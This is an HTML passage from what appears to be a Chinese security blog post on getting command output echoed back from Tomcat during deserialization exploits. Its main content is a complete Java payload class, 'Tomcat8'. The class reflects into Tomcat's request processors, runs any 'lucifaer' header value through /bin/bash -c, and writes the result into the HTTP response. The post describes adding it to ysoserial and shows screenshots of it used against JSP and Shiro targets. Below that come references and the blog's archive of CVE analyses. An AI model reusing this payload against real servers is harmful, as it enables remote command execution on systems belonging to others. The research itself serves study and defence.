class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lucifaer.tomcatEcho;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jmx.mbeanserver.NamedObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.jmx.mbeanserver.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> javax.management.ObjectName;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Lucifaer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 4.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomcat8</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat8</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Repository repository = (Repository) field.get(mbsInterceptor);</span><br><span class="line">            Set&lt;NamedObject&gt; set = repository.query(<span class="keyword">new</span> ObjectName(<span class="string">"*:type=GlobalRequestProcessor,name=\"http*\""</span>), <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Iterator&lt;NamedObject&gt; it = set.iterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                NamedObject namedObject = it.next();</span><br><span class="line">                field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ObjectName flag = (ObjectName) field.get(namedObject);</span><br><span class="line">                String canonicalName = flag.getCanonicalName();</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object obj = field.get(namedObject);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object resource = field.get(obj);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ArrayList processors = (ArrayList) field.get(resource);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; processors.size(); i++) &#123;</span><br><span class="line">                    Request request = (Request) field.get(processors.get(i));</span><br><span class="line">                    String header = request.getHeader(<span class="string">"lucifaer"</span>);</span><br><span class="line">                    System.out.println(<span class="string">"cmds is:"</span> + header);</span><br><span class="line">                    System.out.println(header == <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (header != <span class="keyword">null</span> &amp;&amp; !header.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                        String[] cmds = <span class="keyword">new</span> String[] &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, header&#125;;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                        String out = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span> (s.hasNext()) &#123;</span><br><span class="line">                            out += s.next();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">byte</span>[] buf = out.getBytes();</span><br><span class="line">                        <span class="keyword">if</span> (canonicalName.contains(<span class="string">"nio"</span>)) &#123;</span><br><span class="line">                            ByteBuffer byteBuffer = ByteBuffer.wrap(buf);</span><br><span class="line"><span class="comment">//                    request.getResponse().setHeader("echo", out);</span></span><br><span class="line">                            request.getResponse().doWrite(byteBuffer);</span><br><span class="line">                            request.getResponse().getBytesWritten(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (canonicalName.contains(<span class="string">"bio"</span>)) &#123;</span><br><span class="line">                            <span class="comment">//tomcat 7使用需要使用ByteChunk来将byte写入</span></span><br><span class="line"><span class="comment">//                            ByteChunk byteChunk = new ByteChunk();</span></span><br><span class="line"><span class="comment">//                            byteChunk.setBytes(buf, 0, buf.length);</span></span><br><span class="line"><span class="comment">//                            request.getResponse().doWrite(byteChunk);</span></span><br><span class="line"><span class="comment">//                            request.getResponse().getBytesWritten(true);</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>具体如何将其加入Ysoserial，可以参考<a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener"><code>李三</code>师傅的方式</a>。</p>
+<p>利用效果如下：</p>
+<blockquote>
+<p>测试普通JSP</p>
+</blockquote>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892739066262.jpg" alt=""></p>
+<blockquote>
+<p>测试shiro</p>
+</blockquote>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892739715573.jpg" alt=""></p>
+<h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul>
+<li><a href="https://github.com/buptchk/ysoserial/" target="_blank" rel="noopener">https://github.com/buptchk/ysoserial/</a></li>
+<li><a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener">https://xz.aliyun.com/t/7535</a></li>
+<li><a href="https://blog.csdn.net/yangsnow_rain_wind/article/details/80049506" target="_blank" rel="noopener">https://blog.csdn.net/yangsnow_rain_wind/article/details/80049506</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3</a></li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
+            <p>原文链接: <a href="https://lucifaer.com/2020/05/12/Tomcat通用回显学习/">https://lucifaer.com/2020/05/12/Tomcat通用回显学习/</a>
+            <p>发表日期: <a href="https://lucifaer.com/2020/05/12/Tomcat通用回显学习/">May 12th 2020, 5:20:00 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/10/Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）/" title= Oracle Coherence 反序列化漏洞分析（CVE-2020-2555） >
+                    <div class="prevTitle">Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODcyOC8xNTI1Ng==>
+        <script type="text/javascript">
+            (function(d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+         
+                if (typeof LivereTower === 'function') { return; }
+         
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+         
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+             </script>
+         <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:l.lucifaer@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Lucifaer" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//weibo.com/5838222069" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-思考"><span class="toc-number">1.</span> <span class="toc-text">0x01 思考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-寻找利用链"><span class="toc-number">2.</span> <span class="toc-text">0x02 寻找利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-获取返回包"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 获取返回包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-获取Processor对象"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 获取Processor对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-获取global"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 获取global</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-从Registry中获取"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 从Registry中获取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Reference"><span class="toc-number">4.</span> <span class="toc-text">0x04 Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 40
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2020/05/12/Tomcat通用回显学习/" >Tomcat通用回显学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）/" >Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2020/02/25/WebLogic WLS核心组件RCE分析（CVE-2020-2551）/" >WebLogic WLS核心组件RCE分析（CVE-2020-2551）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2020/02/20/Java CORBA研究/" >Java CORBA研究</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2019/09/25/浅谈RASP/" >浅谈RASP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2019/07/24/Fastjson 流程分析及RCE分析/" >Fastjson 流程分析及RCE分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/2019/05/10/WebLogic wls9-async组件RCE分析（CVE-2019-2725）/" >WebLogic wls9-async组件RCE分析（CVE-2019-2725）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2019/04/19/Confluence 路径穿越漏洞分析（CVE-2019-3398）/" >Confluence 路径穿越漏洞分析（CVE-2019-3398）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2019/04/16/Confluence 未授权RCE分析（CVE-2019-3396）/" >Confluence 未授权RCE分析（CVE-2019-3396）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href= "/2019/03/13/Attack Spring Boot Actuator via jolokia Part 2/" >Attack Spring Boot Actuator via jolokia Part 2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2019/03/11/Attack Spring Boot Actuator via jolokia Part 1/" >Attack Spring Boot Actuator via jolokia Part 1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href= "/2019/03/04/Jenkins RCE分析（CVE-2018-1000861分析）/" >Jenkins RCE分析（CVE-2018-1000861分析）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）/" >Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/2019/01/16/浅析OGNL的攻防史/" >浅析OGNL的攻防史</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/2018/12/25/S2-057（CVE-2018-11776）流程分析/" >S2-057（CVE-2018-11776）流程分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/S2-046（CVE-2017-5638）分析/" >S2-046（CVE-2017-5638）分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2018/12/14/如何解决Pyppeteer的Target closed错误/" >如何解决Pyppeteer的Target closed错误</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/12</span><a class="archive-post-title" href= "/2018/12/12/S2-045（CVE-2017-5638）分析/" >S2-045（CVE-2017-5638）分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href= "/2018/12/05/RF-14310（CVE-2018-12533）分析/" >RF-14310（CVE-2018-12533）分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/" >JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span><a class="archive-post-title" href= "/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/" >phpMyAdmin <= 4.7.7 CSRF分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2018/08/29/Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)/" >Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2018/08/13/MySQLi Cookbook/" >MySQLi Cookbook</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/薅羊毛产业链分析/" >薅羊毛产业链分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/以太坊简介/" >以太坊简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/比特币简介/" >比特币简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链补充/" >区块链补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链基础概念/" >区块链基础概念</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2018/03/02/部署Django/" >部署Django</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2018/02/28/Git Hooks实现项目的自动部署/" >Git Hooks实现项目的自动部署</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2017/10/09/XDCTF Upload 引发出来的一个新思路/" >XDCTF Upload 引发出来的一个新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2017/07/20/Blackhat SEO/" >Blackhat SEO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2017/07/19/PHP反序列化漏洞/" >PHP反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2017/05/27/Joomla 框架的简单跟进/" >Joomla 框架的简单跟进</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2017/05/09/五指CMS任意文件下载漏洞/" >五指CMS任意文件下载漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2017/04/13/Phpcms V9.6.0任意文件写入getshell/" >Phpcms V9.6.0任意文件写入getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/2017/02/06/WordPress REST API 内容注入/" >WordPress REST API 内容注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/" >SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2016 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/" >CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" >IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="Spring"><span class="iconfont-archer">&#xe606;</span>Spring</span>
+    
+        <span class="sidebar-tag-name" data-tags="jolokia"><span class="iconfont-archer">&#xe606;</span>jolokia</span>
+    
+        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+    
+        <span class="sidebar-tag-name" data-tags="Confluence"><span class="iconfont-archer">&#xe606;</span>Confluence</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="环境部署"><span class="iconfont-archer">&#xe606;</span>环境部署</span>
+    
+        <span class="sidebar-tag-name" data-tags="FastJson"><span class="iconfont-archer">&#xe606;</span>FastJson</span>
+    
+        <span class="sidebar-tag-name" data-tags="RichFaces"><span class="iconfont-archer">&#xe606;</span>RichFaces</span>
+    
+        <span class="sidebar-tag-name" data-tags="Jenkins"><span class="iconfont-archer">&#xe606;</span>Jenkins</span>
+    
+        <span class="sidebar-tag-name" data-tags="CookBook"><span class="iconfont-archer">&#xe606;</span>CookBook</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
